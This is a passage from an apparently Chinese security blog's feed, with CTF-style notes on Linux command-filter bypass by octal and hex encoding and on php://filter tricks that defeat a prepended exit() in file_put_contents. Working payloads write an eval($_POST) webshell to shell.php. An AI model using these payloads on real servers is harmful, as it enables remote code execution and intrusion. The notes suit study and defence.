php安全加固</h2><ul><li><a href="https://www.alibabacloud.com/help/zh/faq-detail/50218.htm">PHP环境安全加固</a></li></ul><h2 id="0x09-工具"><a href="#0x09-工具" class="headerlink" title="0x09 工具"></a>0x09 工具</h2><h3 id="htshell"><a href="#htshell" class="headerlink" title="htshell"></a>htshell</h3><ul><li><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/IT-LM/p/6829209.html">php .htaccess文件使用详解</a></li><li><a href="https://blog.51cto.com/wujianwei/2163907">apache配置rewrite及.htaccess文件</a></li><li><a href="https://www.freebuf.com/vuls/218495.html">Apache中.htaccess文件利用的总结与新思路拓展</a></li><li><a href="https://www.awaimai.com/371.html">CGI、FastCGI和PHP-FPM关系图解</a></li><li><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></li><li><a href="https://github.com/sektioneins/pcc">pcc</a></li><li><a href="https://www.php.net/manual/zh/ini.list.php#ini.list"><em>php.ini 配置选项列表</em></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-htaccess利用&quot;&gt;&lt;a href=&quot;#php-htaccess利用&quot; class=&quot;headerlink&quot; title=&quot;php .htaccess利用&quot;&gt;&lt;/a&gt;php .htaccess利用&lt;/h1&gt;&lt;h2 id=&quot;0x01-php-fpm、fa</summary>
      
    
    
    
    <category term="web安全" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://greydr34d.github.io/categories/php/"/>
    
    <category term=".htaccess" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/htaccess/"/>
    
    <category term=".htaccess" scheme="https://greydr34d.github.io/categories/php/htaccess/"/>
    
    
    <category term="php" scheme="https://greydr34d.github.io/tags/php/"/>
    
    <category term="web安全" scheme="https://greydr34d.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ctf" scheme="https://greydr34d.github.io/tags/ctf/"/>
    
    <category term=".htaccess" scheme="https://greydr34d.github.io/tags/htaccess/"/>
    
  </entry>
  
  <entry>
    <title>linux 命令执行绕过思路</title>
    <link href="https://greydr34d.github.io/2020/10/28/linux-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://greydr34d.github.io/2020/10/28/linux-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</id>
    <published>2020-10-28T08:11:23.000Z</published>
    <updated>2021-03-13T08:32:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="dash-八进制绕过-配合-40-41"><a href="#dash-八进制绕过-配合-40-41" class="headerlink" title="dash 八进制绕过(配合$&#40; &#41;)"></a>dash 八进制绕过(配合$&#40; &#41;)</h3><div class="hljs code-wrapper"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;ls /dev&#x27;</span>exp = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:    z = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0o&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)    exp += zprint(exp)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">$(<span class="hljs-built_in">printf</span>$IFS<span class="hljs-variable">$9</span><span class="hljs-string">&quot;\57\162\145\141\144\146\154\141\147&quot;</span>)</code></pre></div><h3 id="bash-十六进制绕过-配合-40-41"><a href="#bash-十六进制绕过-配合-40-41" class="headerlink" title="bash 十六进制绕过(配合$&#40; &#41;)"></a>bash 十六进制绕过(配合$&#40; &#41;)</h3><div class="hljs code-wrapper"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;ls /dev&#x27;</span>exp = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:    z = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)    exp += zprint(exp)</code></pre></div><h4 id="例题：2020-XCTF高校网络安全专题挑战赛（Web部分）-HIDS"><a href="#例题：2020-XCTF高校网络安全专题挑战赛（Web部分）-HIDS" class="headerlink" title="例题：2020 XCTF高校网络安全专题挑战赛（Web部分） HIDS"></a>例题：<a href="https://whoamianony.top/2020/12/27/ctf-bi-sai-ji-lu/xctf-gao-xiao-wang-luo-an-quan-zhuan-ti-tiao-zhan-sai-writeup/#toc-heading-7">2020 XCTF高校网络安全专题挑战赛（Web部分） HIDS</a></h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;绕过思路&quot;&gt;&lt;a href=&quot;#绕过思路&quot; class=&quot;headerlink&quot; title=&quot;绕过思路&quot;&gt;&lt;/a&gt;绕过思路&lt;/h2&gt;&lt;h3 id=&quot;dash-八进制绕过-配合-40-41&quot;&gt;&lt;a href=&quot;#dash-八进制绕过-配合-40-41&quot; class</summary>
      
    
    
    
    <category term="web安全" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="命令执行" scheme="https://greydr34d.github.io/categories/web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="linux" scheme="https://greydr34d.github.io/tags/linux/"/>
    
    <category term="命令执行" scheme="https://greydr34d.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>php://filter利用手法</title>
    <link href="https://greydr34d.github.io/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"/>
    <id>https://greydr34d.github.io/2020/10/28/php-filter%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</id>
    <published>2020-10-28T07:04:49.000Z</published>
    <updated>2021-03-13T15:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-filter利用手法"><a href="#php-filter利用手法" class="headerlink" title="php://filter利用手法"></a>php://filter利用手法</h1><p>常见payload</p><p><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p><code>php://filter/write=convert.base64-decode/resource=shell.php</code></p><div class="hljs code-wrapper"><pre><code class="hljs bash">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<span class="hljs-built_in">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt;        任何没有以 <span class="hljs-built_in">read</span>= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</code></pre></div><h3 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">string.rot13  进行rot13转换string.toupper  将字符全部大写string.tolower  将字符全部小写string.strip_tags 去除空字符、HTML 和 PHP 标记后的结果。功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。（自PHP 7.3.0起已弃用此功能。）</code></pre></div><h3 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode</code></pre></div><h3 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs nsis"><span class="hljs-literal">zlib</span>.deflate 压缩<span class="hljs-literal">zlib</span>.inflate 解压<span class="hljs-literal">bzip2</span>.compress<span class="hljs-literal">bzip2</span>.decompress</code></pre></div><h3 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h3><h2 id="0x01-XXE中的使用"><a href="#0x01-XXE中的使用" class="headerlink" title="0x01 XXE中的使用"></a>0x01 XXE中的使用</h2><p>在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p><p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-693b1469385893.png" alt="QQ截图20160724235335.png"></p><h2 id="0x02-file-put-contents-filename-”-lt-php-exit-”-content"><a href="#0x02-file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="0x02 file_put_contents($filename,”&lt;?php exit();”.$content);"></a>0x02 file_put_contents($filename,”&lt;?php exit();”.$content);</h2><h3 id="1-base64-decode绕过exit"><a href="#1-base64-decode绕过exit" class="headerlink" title="1. base64-decode绕过exit"></a>1. base64-decode绕过exit</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;<span class="hljs-variable">$content</span> .= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;txt&#x27;</span>];file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);</code></pre></div><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p><p>我们即可使用 php://filter协议来施展魔法：<strong>使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</strong></p><p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);</code></pre></div><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，<strong>字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</strong></p><p><strong>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，</strong>而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p><p>payload：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">txt=aPD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906091228807.png" alt="image-20200906091228807"></p><h3 id="2-strip-tags-base64-decode组合利用"><a href="#2-strip-tags-base64-decode组合利用" class="headerlink" title="2. strip_tags+base64-decode组合利用"></a>2. strip_tags+base64-decode组合利用</h3><p>这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p><p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p><div class="hljs code-wrapper"><pre><code class="hljs lisp">echo readfile(&#x27;php<span class="hljs-symbol">://filter/read=string</span>.strip_tags/resource=php<span class="hljs-symbol">://input</span>&#x27;)<span class="hljs-comment">;</span></code></pre></div><p><a href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></a></p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，<strong>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode</strong>。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs bash">txt=PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=&amp;filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></pre></div><h3 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3. rot13"></a>3. rot13</h3><p>除此之外，我们还可以**利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>**，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.rot13/</span>resource=shell.php</code></pre></div><p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p><h3 id="4-加入不存在的过滤器"><a href="#4-加入不存在的过滤器" class="headerlink" title="4. 加入不存在的过滤器"></a>4. 加入不存在的过滤器</h3><p>上面的场景中，考虑如下的payload：</p><p><code>php://filter/write=string.strip_tags|sssss|convert.base64-decode/resource=shell.php</code></p><p>其中ssss过滤器不存在，但是不妨碍我们写入shell，此处php只会报一个warning，并不会结束运行。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906103602914.png" alt="image-20200906103602914"></p><h2 id="0x03-file-put-contents-a-”-lt-php-exit-”-a"><a href="#0x03-file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="0x03 file_put_contents($a,”&lt;?php exit();”.$a);"></a>0x03 file_put_contents($a,”&lt;?php exit();”.$a);</h2><div class="hljs code-wrapper"><pre><code class="hljs php">file_put_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$a</span>);</code></pre></div><h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h3><p><code>$a = php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</code></p><p><strong>php://filter面对不可用的规则是报个Warning，然后跳过继续执行的（不会退出）</strong>，所以按理说这样构造是<strong>“很完美”</strong>的，我们看下base-decode哪些字符👇</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>//filter/write=convertbase<span class="hljs-number">64</span>decodePD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+/resource=Cyc<span class="hljs-number">1</span>e.php</code></pre></div><p>而默认情况下base64编码是以 <code>=</code> 作为结尾的，所以<strong>正常解码的时候到了 <code>=</code> 就解码结束了</strong>，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 <code>=</code> 过不掉，所以导致过滤器解码失败，<strong>从而报错（不过还是会创建文件的，内容由于解码过程出错了，就都丢弃了）</strong></p><h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2. rot13"></a>2. rot13</h3><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">$<span class="hljs-keyword">a</span> = php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-keyword">string</span>.rot13|<span class="hljs-meta">&lt;?</span>cuc cucvasb();<span class="hljs-meta">?&gt;</span>|/resource=Cyc1e.php</code></pre></div><p><img src="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt="img"></p><p>和前面提到的一样，这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag（再补充一下，linux下默认是没有开启的））</p><h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3. iconv字符编码转换"></a>3. iconv字符编码转换</h3><p>这种方法由于之前没有见过，所以感觉这波操作比我的亚索还要秀~，想法是一样的，<strong>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式（当然还有很多，比如utf-8和utf-7），而我们构造的转成可正常解析的</strong></p><p>官方文档中支持的</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><span class="hljs-attribute">UTF7</span>-IMAP<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ASCII</span><span class="hljs-attribute">EUC</span>-JP<span class="hljs-attribute">SJIS</span><span class="hljs-attribute">eucJP</span>-win<span class="hljs-attribute">SJIS</span>-win<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<span class="hljs-attribute">CP932</span><span class="hljs-attribute">CP51932</span><span class="hljs-attribute">SJIS</span>-mac (alias: MacJapanese)<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO (alias: SJIS-DOCOMO)<span class="hljs-attribute">SJIS</span>-Mobile#KDDI (alias: SJIS-KDDI)<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO (alias: UTF-<span class="hljs-number">8</span>-DOCOMO)<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B (alias: UTF-<span class="hljs-number">8</span>-KDDI)<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK (alias: UTF-<span class="hljs-number">8</span>-SOFTBANK)<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI (alias: ISO-<span class="hljs-number">2022</span>-JP-KDDI)<span class="hljs-attribute">JIS</span><span class="hljs-attribute">JIS</span>-ms<span class="hljs-attribute">CP50220</span><span class="hljs-attribute">CP50220raw</span><span class="hljs-attribute">CP50221</span><span class="hljs-attribute">CP50222</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span><span class="hljs-attribute">byte2be</span><span class="hljs-attribute">byte2le</span><span class="hljs-attribute">byte4be</span><span class="hljs-attribute">byte4le</span><span class="hljs-attribute">BASE64</span><span class="hljs-attribute">HTML</span>-ENTITIES (alias: HTML)<span class="hljs-attribute">7bit</span><span class="hljs-attribute">8bit</span><span class="hljs-attribute">EUC</span>-CN<span class="hljs-attribute">CP936</span><span class="hljs-attribute">GB18030</span><span class="hljs-attribute">HZ</span><span class="hljs-attribute">EUC</span>-TW<span class="hljs-attribute">CP950</span><span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span><span class="hljs-attribute">EUC</span>-KR<span class="hljs-attribute">UHC</span> (alias: CP<span class="hljs-number">949</span>)<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span> (alias: CP<span class="hljs-number">1251</span>)<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span> (alias: CP<span class="hljs-number">1252</span>)<span class="hljs-attribute">CP866</span> (alias: IBM<span class="hljs-number">866</span>)<span class="hljs-attribute">KOI8</span>-R<span class="hljs-attribute">KOI8</span>-U<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span> (alias: ArmSCII<span class="hljs-number">8</span>)</code></pre></div><p><strong>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转</strong></p><p>构造payload</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UCS-4LE&quot;</span>,<span class="hljs-string">&quot;UCS-4BE&quot;</span>,<span class="hljs-string">&#x27;aa&lt;?php phpinfo();?&gt;&#x27;</span>);?&lt;aa phpiphp(ofn&gt;?;)</code></pre></div><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php&#x27;</span>;<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php&#x27;</span>;<span class="hljs-comment">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数，所以需要补3个字符</span></code></pre></div><h3 id="4-UCS-2组合rot13"><a href="#4-UCS-2组合rot13" class="headerlink" title="4. UCS-2组合rot13"></a>4. UCS-2组合rot13</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=drom.php&#x27;</span>; <span class="hljs-comment">#同样需要补位，这里补了一个x</span></code></pre></div><p>基础poc：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [        <span class="hljs-string">&#x27;deflate&#x27;</span>,        <span class="hljs-string">&#x27;inflate&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [        <span class="hljs-string">&#x27;compress&#x27;</span>,        <span class="hljs-string">&#x27;decompress&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,        <span class="hljs-string">&#x27;ASCII&#x27;</span>,        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,        <span class="hljs-string">&#x27;SJIS&#x27;</span>,        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,        <span class="hljs-string">&#x27;CP932&#x27;</span>,        <span class="hljs-string">&#x27;CP51932&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;JIS&#x27;</span>,        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,        <span class="hljs-string">&#x27;CP50220&#x27;</span>,        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,        <span class="hljs-string">&#x27;CP50221&#x27;</span>,        <span class="hljs-string">&#x27;CP50222&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,        <span 